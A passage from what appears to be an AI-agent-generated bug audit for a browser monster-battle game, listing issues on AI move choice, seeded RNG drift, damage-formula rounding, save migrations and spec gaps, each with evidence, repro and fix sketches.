**Repro**: Serve over http(s)://, boot Story Mode. `data/builds.csv` (17,398 rows) loads into `csvBuilds`; `makeBuild`/`_storyDowngradeBuildForTier`/`resolveCsvBuildEntry` read only `csvBuilds`. The gen*.json files are never fetched for gameplay (only on CSV fetch failure, or for Tera-frequency UI from gen9.json).

**Blast radius**: The planned curve/tunables retune "leans heavily on builds/grades." EV tiers (`_storyDowngradeBuildForTier` 33606), grade pools (`buildGradePool` 32672), Nature Rater / Move Tutor / Dojo recommendations (all read `csvBuilds`). Editing `data/builds/gen*.json` to retune movesets/EVs/natures will have **zero gameplay effect** under normal serving — the change must land in `data/builds.csv` (or both, kept in sync).

**Fix sketch**: Designate `data/builds.csv` as the single source of truth for the retune and document it in REDESIGN_PLAN §8a touch-points; if gen*.json must persist as a mirror, add a codegen/CI check that regenerates it from the CSV so the two never drift.

**Verification**: After a retune edit, confirm the changed EV/nature/move appears in a live Story battle (csvBuilds path), not just in the JSON. Diff CSV vs JSON to confirm sync.

---

## <a id="ISSUE-044"></a> ISSUE-044: Choice-locked AI re-returns the locked move with zero immunity/wall check — spams 0-dmg moves forever

---
id: ISSUE-044
severity: P1
category: bug
anchor_symbol: getBestMove
current_line_hint: ~18952
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 844cf5ce029b
confidence: high
status: fixed-claude/ecstatic-gauss-RY5hA
---

**Title**: Choice-locked AI re-returns the locked move with zero immunity/wall check — spams 0-dmg moves forever

**Evidence**:
```js
if (attacker.volatile.choiceLock) {
    let lockedMove = validMoves.find(m => m.name === attacker.volatile.choiceLock);
    if (lockedMove) return lockedMove;          // <-- no abilityImmunity / eff===0 / "can't dent" check
    return { name: "Struggle", ... };
}
```
This branch sits ABOVE all scoring. The non-locked path correctly zeroes immune moves (`if (eff === 0 || abilityImmunity(...)) score = 0;` ~L19064), but a choice-locked mon never reaches scoring.

**Repro**: `node scripts/debug/_repro/issue1-immune-spam.mjs` — Choice-Specs Manectric locked into Thunderbolt vs a Lightning Rod holder. `getBestMove` returns Thunderbolt every turn (est dmg = 0). Robust under real `Math.random` (`issue1-robust.mjs`: distinct moves chosen = {Thunderbolt}). Also fires for a merely *resisted* locked move that can't break a wall (`issue1d-allzero.mjs`: Choice-Band Aqua Jet locked vs Ferrothorn, 19.9 dmg).

**Blast radius**: Every choice-item foe in story/PvE. Player exploit: bait the AI into clicking a Choice move, then switch in an immunity/wall — the AI is then locked into a useless move AND (see paired finding) cannot switch out. This is the most exploitable loop found.

**Fix sketch**: In the choice-lock branch, before returning `lockedMove`, check `abilityImmunity(lockedMove, defender, attacker) || getMoveEffectiveness(...) === 0`; if the locked move is immune/zeroed, prefer surrendering the matchup (allow `aiDecision` to switch — see paired finding) or fall through to Struggle only when truly stuck. At minimum, do not treat a 0-damage locked move as a valid attack.

**Verification**: Re-run `issue1-immune-spam.mjs`; case (b) must no longer report "keeps returning same immune move: true". Add an `ai-decision.test.js` case asserting a choice-locked-into-immune foe does not return the immune move.

---

## <a id="ISSUE-045"></a> ISSUE-045: AI spams setup move into an active phazer — `score *= 0.25` penalty loses to near-zero attack scores

---
id: ISSUE-045
severity: P1
category: bug
anchor_symbol: getBestMove
current_line_hint: ~19233
file: battle.html
agents: [battle-engine-debugger]
fingerprint: c9f77d3582aa
confidence: high
status: fixed-claude/ecstatic-gauss-RY5hA
---

**Title**: AI spams setup move into an active phazer — `score *= 0.25` penalty loses to near-zero attack scores

**Evidence**:
```js
// Phazer / Haze / Unaware on the field or bench — setup will be undone or ignored.
if (defHasPhazer || defHasUnaware) score *= 0.25;   // multiplicative only
else if (benchHasPhazer) score *= 0.55;
```
When the AI's attacking moves do ~0 into the wall, 0.25 × (setup base ~80) still beats them. The Unaware case is saved elsewhere (it picks an attack), but the *phazer* case is not: the boost is real (so setup scores high) yet gets immediately Whirlwind/Roar'd away.

**Repro**: `node scripts/debug/_repro/issue3-trollfamily.mjs` (3b) and `issue3-deep.mjs`: Dragonite (Dragon Dance/Earthquake/Extreme Speed/Roost) vs Skarmory with Whirlwind. EQ est = 0 (Steel/Flying immune to Ground), Extreme Speed est = 10. AI clicks Dragon Dance for 4 straight turns (until +4 atk makes E-Speed win), robust across all RNG seeds incl. real `Math.random`. Each turn Skarmory phazes the boost away → net-zero loop.

**Blast radius**: Any setup sweeper the AI brings against a Whirlwind/Roar/Dragon Tail/Circle Throw user it can't dent. Player exploit: park a phazing wall; the AI burns turns boosting into the wind. Lower exploit ceiling than the choice-lock loop (needs a wall the AI can't hurt + an active phazer) but very reliable when it occurs.

**Fix sketch**: When `defHasPhazer` (active, not just bench) AND the AI cannot OHKO/2HKO, treat setup as near-worthless (hard cap, e.g. `score = Math.min(score, 5)`), not a 0.25 multiplier. Better: don't repeat-setup if the active foe carries a phazer and we already have ≥1 relevant boost.

**Verification**: Re-run 3b; Dragonite should pick its best available action (or switch) rather than Dragon Dance ≥3 turns running. The control case (Skarmory without Whirlwind) should still permit a DD when setup is genuinely safe.

---

## <a id="ISSUE-046"></a> ISSUE-046: Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing

---
id: ISSUE-046
severity: P1
category: inconsistency
anchor_symbol: illegalDealer
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 09f2ddbbdfb4
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing

**Evidence**:
```
$ grep -nE 'illegalDealer|illegal_dealer|enterDealer|dealerOffer' battle.html
(no matches)
```

**Repro**: Visit City6 / City8 (the spec-promised "seedy hubs") at any badge count. No single-NPC contract loop appears. Spec promises one offer per city visit, six-to-ten contract templates (`Trade one party mon for two of same grade`, `Sell mon for large gold`, `Reveal next fixed trainer team`, etc.), the `Contraband Capsule` token item, plus hidden itinerary-clue reveals.

**Blast radius**: Differentiation table §3.5 contrasts Mart / Dept / Black Market / Illegal Dealer — the fourth identity is unrealized, so the "broad illegal catalog vs single shady contract" design split has no surface in code. Depends on Black Market only conceptually; could ship independently.

**Fix sketch**: New `illegalDealerOffer(cityIdx)` generator + `sm.illegalDealerOfferByCity` save field, render hook in `renderCityActions` for `cityIdx ∈ {6,8}` when `sm.blackMarketUnlocked === true`. Author bark / accept / decline dialogue and the contract template pool.

**Verification**: Visit City6 with `sm.blackMarketUnlocked = true`; see a single-NPC offer chip; declining clears it for the visit, leaving for next city restores it.

---

## <a id="ISSUE-047"></a> ISSUE-047: City-8 legendary Mystery gate is bypassed if party has < 6 members

---
id: ISSUE-047
severity: P1
category: bug
anchor_symbol: isPreLeagueLegendaryMysteryGate
current_line_hint: ~42530
file: battle.html
agents: [story-mode-investigator]
fingerprint: 659dab26287d
confidence: high
status: fixed-main
---

**Title**: City-8 legendary Mystery gate is bypassed if party has < 6 members

**Evidence**:
```js
// enterProfessor: mystery (legendary) mode only when party is AT the badge cap
const isFull = sm.team.length >= _storyMaxPartySize(); // 6 at 8 badges
_profMysteryMode = isFull;
_profLegendaryMysteryMode = _profMysteryMode && isPreLeagueLegendaryMysteryGate(cityIdx);
// renderCityActions:
const swapMode = hasProf && !hasTeamRoom && !profUsedHere;   // needs party==6
const legendMysteryGate = swapMode && _legendaryGateHere;    // false when party<6
```

**Repro**: Reach the City-8 post-gym hub (row 55, 8 badges) with a party of 5 or fewer. The hub forces a *normal* G2 Professor pick (PROF_ROLLS[8] = {g2:100}) instead of the legendary Mystery Figure gate. Accepting it fills slot 6 and sets profUsed[8], opening Leave City — the player never receives the legendary nor sees the gate. seedDebugMysteryLegendGate itself only ever builds a 6-mon filler team, confirming the gate was designed for the at-cap case exclusively.

**Blast radius**: Victory Road framing ("no challenger walks the final gate without a legendary in hand") is broken for lean runs; the legendary reward and the one-time 'legendary-gate' tip never fire. Related to prior audit item 1.9 (post-HoF variant), but this is the live pre-League gate.

**Fix sketch**: Treat the City-8 legendary gate as legendary-mode whenever isPreLeagueLegendaryMysteryGate(cityIdx) is true regardless of isFull — when party<6, append the legendary to the team (free add) instead of forcing a swap; keep the swap/send-to-PC flow only at 6/6.

**Verification**: Set up sm at City8 row 55, badges=8, team of 4; call enterProfessor; assert _profLegendaryMysteryMode is true and the offered species is legendary-tier.

---

## <a id="ISSUE-048"></a> ISSUE-048: Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented

---
id: ISSUE-048
severity: P1
category: inconsistency
anchor_symbol: itineraryProgress
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 4f2f5373374e
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented

**Evidence**:
```
$ grep -niE 'itineraryProgress|itineraryBeat|runItinerary|enterItinerary|sm\.itinerary' battle.html
(no matches)
```

**Repro**: No itinerary beat fires at any event index. Spec §8 promises ordering `itinerary → wild → wager prompt → trainer` in `proceedToNextBattle`; today the order is just `wild → trainer`.

**Blast radius**: Every downstream spec system hangs off this — Black Market unlock comes from itinerary beat `blackMarketUnlock`, Safari Zone trigger is "after badge 3 / City3 segment", the three-act villain arc anchors to `sm.itineraryProgress` per `STORY_MODE_AUDIT.md` §14. Without the scaffold, the spec's narrative arc cannot exist.

**Fix sketch**: Author `STORY_ITINERARY` const (one row per beat: id, trigger condition, payload such as `{kind:'blackMarketUnlock'}`, `{kind:'safariType', type:'water'}`), add `sm.itineraryProgress = {}` to migrateStoryPreV20, implement `runItineraryBeat(beatId)` and call from `proceedToNextBattle` before `enterBattleEvent`.

**Verification**: After badge 3, on the route to City3, the itinerary engine fires a beat that flags `sm.blackMarketUnlocked = true` before the next trainer fight.

---

## <a id="ISSUE-049"></a> ISSUE-049: `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped

---
id: ISSUE-049
severity: P1
category: bug
anchor_symbol: lastRemoteSeq
current_line_hint: ~501
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: ff27549bd4fe
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped

**Evidence**:
```js
// online-pvp.js L498-507
remoteRowQueue = remoteRowQueue
    .then(async () => {
        const d = newRow.data || {};
        if ((d.seq || 0) <= lastRemoteSeq) return;          // gate
        lastRemoteSeq = d.seq || lastRemoteSeq + 1;          // bump BEFORE await
        if (typeof global.onOnlineRoomData === 'function') {
            await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
            // ^ if this throws, lastRemoteSeq is already advanced;
            //   the same seq will never re-enter the handler.
        }
    })
    .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
```

**Repro**: Force `onOnlineRoomData` to throw for a specific seq (e.g., guest receives `battle_start_blob` with a malformed JSON — `applyBattleSnapshot` returns false at L755 but earlier in the chain a `JSON.parse` could throw). `lastRemoteSeq` is now at that seq. The next legitimate update at seq+1 passes the gate fine, but the broken seq's data is *lost* — the guest's local state never reflects whatever info the broken row carried (e.g., new wins count, host display name update at L748-753). Symptom: scoreboard shows stale data even though both peers are connected.

**Blast radius**: Every conditional branch inside `onOnlineRoomData` (battle.html:14681-14760). Some are idempotent (later rows carry the same data, so the lost update is recovered when the next seq arrives — e.g., `host_display_name` is re-broadcast on every push). Others are not: `d.battle.state_blob` only arrives on resolved turns; a lost resolved-turn seq leaves the guest stranded a turn behind, and the host won't re-broadcast that exact seq.

**Fix sketch**: Move the `lastRemoteSeq` bump *after* a successful handler completion. Use a temporary "in-flight" marker if you need to deduplicate within a single tick. Pattern:
```js
remoteRowQueue = remoteRowQueue.then(async () => {
    const incoming = d.seq || 0;
    if (incoming <= lastRemoteSeq) return;
    try { await Promise.resolve(global.onOnlineRoomData(d, ...)); }
    catch (e) { console.warn(...); /* do NOT advance seq */ return; }
    lastRemoteSeq = incoming;   // only on success
});
```
Combined with the timeout from the previous finding, this stays robust against hung handlers (timeout → seq does not advance → next row at same seq is allowed to retry).

**Verification**: Test: inject one row at seq=5 where the handler throws, then a row at seq=6. Assert: after both, `lastRemoteSeq === 5` (or the system retried seq=5), not 6.

---

## <a id="ISSUE-050"></a> ISSUE-050: Save-migration integration test never exercises the migrate chain (vacuous pass)

---
id: ISSUE-050
severity: P1
category: dx
anchor_symbol: migrateStoryPreV15
current_line_hint: ~31873
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2ff4479d31a1
confidence: high
status: open
---

**Title**: Save-migration integration test never exercises the migrate chain (vacuous pass)

**Evidence**:
```js
// tests/integration/save-migration.test.js
test('migrateStoryPreV15 function exists OR migrations are not yet exposed', async () => {
  const { window } = await loadEngine();
  const fn = window.migrateStoryPreV15;
  if (typeof fn !== 'function') { return; }  // <-- always taken; not exported
  ...
// And the "pre-v15 save" fixture uses the WRONG key:
const preV15 = { saveVer: 14, ... };  // load() reads d.version, not d.saveVer
```

**Repro**: `grep -n "window.migrateStory" battle.html` returns nothing — migration fns live inside the `window.StoryMode = (function(){…})()` IIFE and are not exported. The test's guard `if (typeof fn !== 'function') return` is therefore always taken. The second test's fixture sets `saveVer: 14` but `load()` (battle.html:32228) keys on `d.version`; `version:undefined < 2` makes `load()` bail before any migration runs.

**Blast radius**: The pre-v15 → v20 round-trip (the single most safety-critical path for not bricking returning players) has ZERO real test coverage despite the test file's name. A regression in any `migrateStoryPreV<N>` would pass CI.

**Fix sketch**: Either expose the migration entry (or a test-only `__runStoryMigrations(saveObj)` hook) on `window.StoryMode`, then drive a real `{version:14,...}` fixture through it and assert post-state (pcBox array, balls default, hardcore→normal, stable ids, ivs grandfathered, daycare/pits seeded). At minimum, fix the fixture key `saveVer`→`version`.

**Verification**: New assertions on migrated `sm` fields; mutate one migration to break a field and confirm the test goes red.

---

## <a id="ISSUE-051"></a> ISSUE-051: v14 trainer-assignment migration is bundled under `_loadedVer < 13`, so v13 saves skip it

---
id: ISSUE-051
severity: P1
category: bug
anchor_symbol: migrateStoryTrainerAssignmentsPreV14
current_line_hint: ~30939
file: battle.html
agents: [story-mode-investigator]
fingerprint: d1e01d9e6e3e
confidence: high
status: fixed-main
---

**Title**: v14 trainer-assignment migration is bundled under `_loadedVer < 13`, so v13 saves skip it

**Evidence**:
```js
// battle.html ~30939
if (_loadedVer < 13) {
    try { migrateStoryArtifactShopPreV13(); } catch (e) { ... }
    try { migrateStoryTrainerAssignmentsPreV14(); } catch (e) { ... } // ← wrong guard
}
if (_loadedVer < 15) {
    try { migrateStoryPreV15(); } catch (e) { ... }
}
// no `_loadedVer < 14` block exists anywhere
```

**Repro**: Craft a save with `version: 13` (or replay any save that was last opened during v13's lifetime — those saves rewrite `sm.version = SAVE_VER` on the next load, so they'd skip the v14 fix forever afterward). The v14 fix remaps `'Blue Champion' / 'Red' (in Elite Trainer slots) / 'Blue 2' / 'Silver 2' / 'Gladion 2' / 'Lt. Surge 2'` → the appropriate canonical names. A v13 save with one of those legacy assignment names will keep it, breaking the trainer dispatch when the row's expected event type doesn't match.

**Blast radius**: Narrow — only saves that loaded once at exactly v13. Symptoms: an Elite Trainer slot might display "Blue Champion" or roll the Champion's roster on an E1 row. Already-current v14+ saves are unaffected (they ran the fix when they were v13).

**Fix sketch**: Move the v14 migration to its own block:
```js
if (_loadedVer < 13) { try { migrateStoryArtifactShopPreV13(); } catch (e) {} }
if (_loadedVer < 14) { try { migrateStoryTrainerAssignmentsPreV14(); } catch (e) {} }
```

**Verification**: After fix, hand-craft a `version:13` save with `trainerAssignments[34] = 'Blue Champion'`. Load it; the assignment should remap to the appropriate canonical name. Pre-fix, the migration is silently skipped.

---

## <a id="ISSUE-052"></a> ISSUE-052: Secondary flinch/Stench write `defender.volatile.flinch` unguarded — throws if volatile missing (sibling _tryConfuse guards it)

---
id: ISSUE-052
severity: P1
category: bug
anchor_symbol: parseMoveEffects
current_line_hint: ~25902
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 37ef284799b0
confidence: high
status: open
---

**Title**: Secondary flinch/Stench write `defender.volatile.flinch` unguarded — throws if volatile missing (sibling _tryConfuse guards it)

**Evidence**:
```js
const _tryConfuse = () => { if (!defender.volatile) return; ... };   // GUARDED
...
if (_sec.volatileStatus === 'flinch') defender.volatile.flinch = true;   // 25902 UNGUARDED
...
if (attacker.ability === "Stench" && ... && !defender.volatile.flinch && Math.random()<0.1)  // 25918 UNGUARDED
    defender.volatile.flinch = true;
```

**Repro**: `scripts/debug/_repro/secondary-volatile.mjs` — build Snorlax, set `def.volatile = undefined`, call `parseMoveEffects(atk, def, AirSlash, true)`. Result: throws `Cannot set properties of undefined (setting 'flinch')`. The confusion path on the same loop returns cleanly because it guards `if (!defender.volatile) return`; the flinch path does not. A throw here is caught only by the playTurn turn-skip handler -> "Turn skipped" mid-move.

**Blast radius**: Every flinch secondary (Air Slash, Iron Head, fang moves, Rock Slide) and Stench. Triggered whenever a defender's `volatile` is transiently absent (some transform / forme-revert / freshly-spawned-mon paths).

**Fix sketch**: Guard the flinch writes the same way `_tryConfuse` guards: `if (defender.volatile) defender.volatile.flinch = true;` (and gate the Stench `!defender.volatile.flinch` read).

**Verification**: Re-run the repro after the guard; assert no throw and the move still resolves.

---

## <a id="ISSUE-053"></a> ISSUE-053: Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift

---
id: ISSUE-053
severity: P1
category: bug
anchor_symbol: parseMoveEffects
current_line_hint: ~24350
file: battle.html
agents: [consistency-auditor]
fingerprint: 0729606b5ddb
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift

**Evidence**:
```js
// L24350  if (move.name === "Bounce" && Math.random() < 0.3) { applyStatus(defender, "PAR"); return; }
// L24427  let newType = resistTypes[Math.floor(Math.random() * resistTypes.length)];
// L24461  if (statusCode && Math.random() < (sereneGrace ? Math.min(1, chance * 2) : chance)) {
// L24729  let newMon = bench[Math.floor(Math.random() * bench.length)];   // Roar/Whirlwind switch
// L24885  let _acuStat = _acuAvail[Math.floor(Math.random() * _acuAvail.length)]; // Acupressure
// L24991  if (move.name === "Tri Attack" && Math.random() * 100 < _sg(20)) {
// L24992  let _tr = Math.floor(Math.random() * 3);  // Tri Attack BRN/FRZ/PAR
// L25019  if (Math.random() * 100 >= _sg(_secChance)) continue; // data-driven secondary
// L25038  if (attacker.ability === "Stench" && ... && Math.random() < 0.1) {
```

**Repro**: Load story with `?seed=X`, fight a battle where the opponent has Tri Attack / Acupressure / a secondary-effect mover (e.g. Iron Head with 30% flinch). Re-load the same seed and replay the same inputs — the outcome diverges because each of these branches consults `Math.random()` instead of the seeded `storyRngNext` (which sibling sites at L24228 thaw, L25002 confuse, L25083 trap, L25526 cr, L26481 harvest correctly call).

**Blast radius**: All story-mode seeded replays. Daily-seed contests. Player-shared run-the-seed videos. Class is exactly the one the spec called out months ago — these sites were missed when the audit converted confusion/trap/thaw/harvest. At least 9 distinct sites in `parseMoveEffects` plus the broader status/end-of-turn pipeline.

**Fix sketch**: At the top of `parseMoveEffects` (or right before the first call site), bind `const _rng = (sm && sm.active) ? storyRngNext : Math.random;` and replace every bare `Math.random()` inside the function body with `_rng()`. Mirror the same pattern in `applyStatus`, `endOfTurnEffects`, the speed-tie block in the main turn loop (L19368), and the Quick Claw rolls (L19353-19354).

**Verification**: New seeded-replay test: run the same seed × two trials through a battle that triggers Tri Attack / Bounce-paralysis / Roar / Static-on-contact. Assert identical move sequences. Existing `tests/integration/story-flow.test.js` seeded assertion should catch any regression on the converted sites.

---

## <a id="ISSUE-054"></a> ISSUE-054: Core damage roll, crit, and accuracy use bare `Math.random()` — the highest-impact drift sites

---
id: ISSUE-054
severity: P1
category: bug
anchor_symbol: parseMoveEffects-damage-core
current_line_hint: ~20742
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 160c710ca9f8
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Core damage roll, crit, and accuracy use bare `Math.random()` — the highest-impact drift sites

**Evidence**:
```js
// battle.html:20742 — accuracy check
if (!neverMiss && Math.random() * 100 > finalAcc) { ... }
// battle.html:21182 — critical hit roll
let crit = (!armorBlocksCrit && Math.random() < critRate) ? (attacker.ability === "Sniper" ? 2.25 : 1.5) : 1;
// battle.html:21676 — damage random factor 0.85-1.0
let rng = 0.85 + (Math.random() * 0.15);
```

These three fire on **every damaging move**. Sibling sites: 22094 (multi-hit per-strike accuracy), 21460 / 21456 (multi-hit count), 22151 / 22998 (self-effect chance), 22025 (random secondary), 22075 (Focus Band 10%).

**Repro**: Any seeded story battle, snapshot turn-1 damage of a vanilla attack, reload — the exact damage value differs because of the 0.85–1.00 roll.

**Blast radius**: Every damage interaction. Without this fix, no story replay can be byte-identical regardless of other fixes.

**Fix sketch**: Best architectural fix — install a mulberry32 patch on `Math.random` at story-run start, mirroring `tests/helpers/seeded-rng.js`'s `installMathRandom`. One ~10-line change covers all 262 bare sites in battle.html and converges test and production. Alternative: define a `_bRng()` helper near the top of `parseMoveEffects` and replace each call individually (higher diff, easier review).

**Verification**: `npm run debug:replay diff <seed>` produces byte-identical transcripts across two invocations.

---

## <a id="ISSUE-055"></a> ISSUE-055: Damage formula divides un-truncated (fractional) A/D — Showdown floors atk/def stats first (±1 HP)

---
id: ISSUE-055
severity: P1
category: bug
anchor_symbol: parseMoveEffects-damage-formula
current_line_hint: ~23640
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 6922faf9569e
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Damage formula divides un-truncated (fractional) A/D — Showdown floors atk/def stats first (±1 HP)

**Evidence**:
```js
// battle.html:23640 — A and D are never Math.floor()'d after stage/item/ability mults
let damage = Math.floor((Math.floor(Math.floor(22 * basePower * (A / D)) / 50) + 2) * modifier);
// A,D come from e.g. attacker.stats.atk * getStageMult(stage) (1.5 on +1) and Choice Band A*=1.5,
// Eviolite D*=1.5, Marvel Scale modifier*=2/3, etc. -> A,D routinely fractional (e.g. 85*1.5=127.5).
```

Showdown truncates the *modified* Attack and Defense to integers (`tr()`/pokeRound) before the
`atk/def` division. This engine keeps them fractional and floors only the product. For integer A/D the
two are identical (verified 0/5115), but whenever a stage boost (odd stat ×1.5) or item/ability mult makes
A or D fractional, the results diverge by ±1 HP in ~14% of cases (8655 reachable Lv50 combos enumerated).

**Repro**: `node scripts/debug/_repro/ad-diverge.mjs` — Pound (BP40, no STAB, neutral) with atk=41 at +1 stage (→61.5) vs def=40, roll pinned 0.99, no crit: **engine deals 28 HP, Showdown deals 27 HP** (engine over-damages because A stays 61.5 instead of flooring to 61). Confirmed against the live engine via the jsdom harness.

**Blast radius**: Every attack with a boosted/dropped stat, a Choice item, Eviolite, Assault Vest, Marvel Scale, Hustle, Huge Power on an odd base, etc. Affects OHKO/2HKO break-points and any future `@smogon/calc` point comparison. The damage-formula test suite mirrors the engine's own formula, so it cannot catch this; deviations.md does not document it.

**Fix sketch**: Truncate A and D to integers right before the formula: `A = Math.floor(A); D = Math.floor(D);` (or floor each modified stat as it is applied, mirroring Showdown's per-step `tr()`). Keep the existing `A/D`-first ordering — that part already matches Showdown for integer stats.

**Verification**: Re-run `scripts/debug/_repro/ad-diverge.mjs`; engine should now deal 27. Add a focused test: +1-stage odd-atk attacker vs integer-def defender, assert HP matches Showdown's floored-stat value.

---

## <a id="ISSUE-056"></a> ISSUE-056: Damage roll is continuous `0.85+rand*0.15` — never reaches 100%, so max-roll damage is unreachable

---
id: ISSUE-056
severity: P1
category: bug
anchor_symbol: parseMoveEffects-damage-roll
current_line_hint: ~23349
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 36c4d7d6540c
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Damage roll is continuous `0.85+rand*0.15` — never reaches 100%, so max-roll damage is unreachable

**Evidence**:
```js
// battle.html:23349
let rng = 0.85 + (Math.random() * 0.15);
// damage = Math.floor((base+2) * modifier)  where modifier includes rng
```

Showdown uses 16 *discrete* integer factors (85,86,…,100)/100 applied to the running integer damage:
`damage = floor(damage * (100 - randomFactor)/100)`, randomFactor ∈ {0..15}. Because `Math.random()` is
`[0,1)`, this engine's roll maxes at `0.85+0.99…×0.15 < 1.0`, so `floor(base × <1.0)` is **always at least 1 below the true max-roll**. It also produces intermediate damage values Showdown can never produce (continuous vs 16-step ladder).

**Repro**: `node scripts/debug/_repro/roll-max.mjs` — neutral Pound, A=D (base 19). With `Math.random()` pinned to 0.999999, **engine deals 18; Showdown max-roll is 19.** The engine cannot deliver the 100% roll on any move. Runtime-confirmed via the harness. (This persists under the seeded mulberry32 install — it is independent of ISSUE-026's RNG seeding.)

**Blast radius**: Every damaging move's high end. A move that is a *guaranteed* OHKO/2HKO at max roll in Showdown may fail to KO here at the top of its range — directly affects break-point/KO-chance correctness and any range-vs-Showdown comparison.

**Fix sketch**: Replace the continuous roll with the canonical 16-step integer form: pick `f = 85 + floor(rand*16)` (0..15 → 85..100) and apply `damage = floor(damage * f / 100)` in the modifier pipeline. This makes 100% reachable and matches Showdown's discrete ladder.

**Verification**: Re-run `scripts/debug/_repro/roll-max.mjs`; max roll should now equal `base` (19). Property test: over many seeds the observed roll multipliers should be exactly the 16 values 0.85..1.00.

---

## <a id="ISSUE-057"></a> ISSUE-057: Eight contact-triggered defender ability procs (Static / Poison Point / Flame Body / Cute Charm / Effect Spore / Toxic Chain / Cursed Body / Poison Touch) all use bare `Math.random()`

---
id: ISSUE-057
severity: P1
category: bug
anchor_symbol: parseMoveEffects-on-contact-abilities
current_line_hint: ~22461
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 436d3fa608c1
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Eight contact-triggered defender ability procs (Static / Poison Point / Flame Body / Cute Charm / Effect Spore / Toxic Chain / Cursed Body / Poison Touch) all use bare `Math.random()`

**Evidence**:
```js
// battle.html:22461-22485
if (defender.ability === "Static" && Math.random() < 0.3) applyStatus(attacker, "PAR");
if (defender.ability === "Poison Point" && Math.random() < 0.3) applyStatus(attacker, "PSN");
if (defender.ability === "Flame Body" && Math.random() < 0.3) applyStatus(attacker, "BRN");
if (defender.ability === "Cute Charm" && Math.random() < 0.3 ...) { ... }
// Effect Spore: let roll = Math.random() * 100;  (9/10/11 split)
if (attacker.ability === "Poison Touch" && Math.random() < 0.3) applyStatus(defender, "PSN");
// Toxic Chain at 22479, Cursed Body at 22485 — same pattern
```

Eight sites clustered under `if (isContactMove(move) && !hitSub && ...)`. Note: Cursed Body / Toxic Chain at lines 23049 / 23296-23362 already use the gated pattern; the 22485 site is the un-gated copy.

**Repro**: Trainer with Static Pikachu, player Tackles. Two seeded story replays differ on PAR proc.

**Blast radius**: All on-hit ability procs in story replays. Player UX: "I reloaded and got paralyzed this time."

**Fix sketch**: At the top of the contact-trigger block: `const _r = (sm && sm.active) ? storyRngNext : Math.random;` then replace the eight `Math.random()` calls.

**Verification**: Fixture battle (Tackle vs Static Pikachu × N turns); PAR-applied turn indices match across two replays at the same seed.

---

## <a id="ISSUE-058"></a> ISSUE-058: Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()`

---
id: ISSUE-058
severity: P1
category: bug
anchor_symbol: parseMoveEffects-onhit-abilities
current_line_hint: ~22461
file: battle.html
agents: [consistency-auditor]
fingerprint: aa60883b8c97
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()`

**Evidence**:
```js
// L22461-L22485 — on-contact / on-hit ability procs
if (defender.ability === "Static" && Math.random() < 0.3) applyStatus(attacker, "PAR");
if (defender.ability === "Poison Point" && Math.random() < 0.3) applyStatus(attacker, "PSN");
if (defender.ability === "Flame Body" && Math.random() < 0.3) applyStatus(attacker, "BRN");
if (defender.ability === "Cute Charm" && Math.random() < 0.3 ...) { ...
if (attacker.ability === "Poison Touch" && Math.random() < 0.3) applyStatus(defender, "PSN");
if (attacker.ability === "Toxic Chain" && ... && Math.random() < 0.3) { ...
if (defender.ability === "Cursed Body" && Math.random() < 0.3 && move.name) { ...
// L22538 — Tough Claws-style ability tick: if (... && Math.random() < 0.1)
// L22075 — Focus Band proc: && Math.random() < 0.1
// L22151 — recoil/self-stat secondary: if (Math.random() * 100 < _selfChance)
```

**Repro**: Story-mode fight against a Static Pikachu — same seed, same inputs, two different "paralysed on contact" outcomes.

**Blast radius**: These procs gate huge follow-on consequences (PAR drops Speed; PSN/BRN deal chip damage; Cursed Body locks a move). Drift here can change the seed result by 5-10 turns.

**Fix sketch**: Same shim. Convert every `Math.random()` call inside `parseMoveEffects` between L22000-23000 (on-hit / ability / item-trigger region) to the seeded `_rng()`. Audit the whole damage-resolution block in one sweep.

**Verification**: Seeded replay where the foe runs Static. Assert PAR-on-contact happens (or doesn't) identically across runs.

---

## <a id="ISSUE-059"></a> ISSUE-059: PC_BOX_CAP is 30 in code but the canonical spec says 10

---
id: ISSUE-059
severity: P1
category: inconsistency
anchor_symbol: PC_BOX_CAP
current_line_hint: ~38560
file: battle.html
agents: [story-mode-investigator]
fingerprint: fad97b9dadac
confidence: high
status: wontfix-ratified-pc-box-cap-30
---

**Title**: PC_BOX_CAP is 30 in code but the canonical spec says 10

**Evidence**:
```js
// battle.html ~38560
const PC_BOX_CAP = 30;

// STORY_MODE_FLOW.md §1 (canonical):
//   PC | Pure storage. Flat array, cap 10 (story is battle-focused,
//   not a collection layer)…
// STORY_MODE_FLOW.md §7:
//   PC Storage … Capacity 10 — intentionally tight, since the run is
